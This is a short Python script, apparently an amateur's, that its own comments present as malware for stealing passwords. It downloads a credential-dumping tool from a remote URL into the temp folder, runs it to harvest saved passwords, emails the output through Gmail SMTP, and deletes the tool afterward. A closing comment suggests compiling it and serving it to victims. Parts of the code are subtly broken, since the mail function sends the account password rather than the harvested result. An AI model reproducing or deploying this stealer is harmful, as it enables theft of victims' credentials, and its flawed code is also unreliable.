import requests
import tempfile
import smtplib
import os
import subprocess


#this code is supposed to correct all password that are saved in computer 

#then it send the password to the email

#then remove the lagZne.exe that is supposed to aid in the collections of password

#this assumes that the lagZne is hosted on remote server and then after that it the url will server the tool
#by downloading it



def collect_password(url):

    get_response=requests.get(url)

    filename=url.split("/")[-1]

    with open(filename,"wb") as file:

        file.write(get_response.content)



temp_directory=tempfile.gettempdir()

os.chdir(temp_directory)


collect_password("enter the url of the lagzne")

def send_mail(email,password,message):

    server=smtplib.SMTP('smtp.gmail.com',587)

    server.starttls()

    server.login(email,password)

    server.sendmail(email,email,password)

    server.quit()



result=subprocess.call("lagZne all",shell=True)

send_mail("your email","password of your email",result)

os.remove("lagZne.exe")

#it can be then be conmpiled and be served as a form of malware so long as the victim computer has internet connection to download the 
# tool